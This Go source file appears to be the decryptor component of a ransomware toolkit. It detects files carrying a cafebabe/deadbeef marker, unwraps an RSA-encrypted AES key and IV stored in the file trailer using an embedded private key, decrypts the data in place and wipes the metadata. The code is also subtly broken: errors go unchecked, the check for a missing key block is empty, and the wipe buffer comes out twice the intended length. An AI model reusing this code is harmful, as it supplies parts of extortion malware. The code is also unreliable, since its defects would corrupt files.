package internaldecryptor

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	b64 "encoding/base64"
	"encoding/pem"
	"fmt"
	"log"
	"os"
)

// Decrypt decrypts given file
func Decrypt(filepath string, logFile *os.File) bool {

	// private key
	b, _ := b64.StdEncoding.DecodeString(myprivate)
	pemBlock, _ := pem.Decode(b)
	if pemBlock == nil {
	}

	rsaPrivateKey, err := x509.ParsePKCS1PrivateKey(pemBlock.Bytes)
	if err != nil {
		fmt.Println("error parsing private key", err)
	}

	/* reader writers setup */
	// file handle + reader object
	var ret int64
	f, err := os.OpenFile(filepath, os.O_RDWR, 0755)
	if err != nil {
		log.Println("[-] Error reader", err)
		return false
	}
	r := bufio.NewReader(f)

	d, err := os.OpenFile(filepath, os.O_RDWR, 0755)
	ret, err = d.Seek(seekStart, 0)
	w := bufio.NewWriter(d)

	// setup readerWriter object
	rw := bufio.NewReadWriter(r, w)

	/* check if file is not encrypted */
	ds, err := f.Stat()
	ret, err = f.Seek(ds.Size()-8, 0)
	signature := make([]byte, 8)
	_, err = rw.Read(signature)
	if !bytes.Equal(signature, []byte{0xca, 0xfe, 0xba, 0xbe, 0xde, 0xad, 0xbe, 0xef}) {
		f.Close()
		d.Close()
		return false
	}

	/* decryption routine */
	// Read IV from file
	ret, err = f.Seek(ds.Size()-152, 0)
	rw.Reader.Reset(f)
	iv := make([]byte, 16)
	_, err = rw.Read(iv)
	if err != nil {
		log.Println("[-] Error reading IV", err)
		f.Close()
		d.Close()
		return false
	}

	// read AES encrypted key
	ret, err = f.Seek(ds.Size()-136, 0)
	rw.Reader.Reset(f)
	encryptedKey := make([]byte, 128)
	_, err = rw.Read(encryptedKey)
	if err != nil {
		log.Println("[-] Error reading AES key", err)
		f.Close()
		d.Close()
		return false
	}

	aesKey, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, rsaPrivateKey, encryptedKey, []byte(""))
	buf := make([]byte, dataLen)
	ret, err = f.Seek(seekStart, 0)
	ret, err = d.Seek(seekStart, 0)
	rw.Writer.Reset(d)
	rw.Reader.Reset(f)
	_, err = rw.Read(buf)
	// decrypt encrypted bytes
	decryptedBytes, err := decryptCBC(aesKey, buf, iv)
	if err != nil {
		log.Println("[-] Error in decryptCBC", err)
		f.Close()
		d.Close()
		return false
	}

	// write
	rw.Write(decryptedBytes)
	rw.Flush()

	// remove encryption metadata
	// seek to end of file
	ret, err = d.Seek(ds.Size()-152, 0)
	if err != nil {
		log.Println(err, ret)
	}
	w.Reset(d)
	// init empty bytes
	buffa := make([]byte, 152)
	for i := 0; i < 152; i++ {
		buffa = append(buffa, byte(0))
	}

	w.Write(buffa)
	w.Flush()

	// close files
	f.Close()
	d.Close()

	return true
}
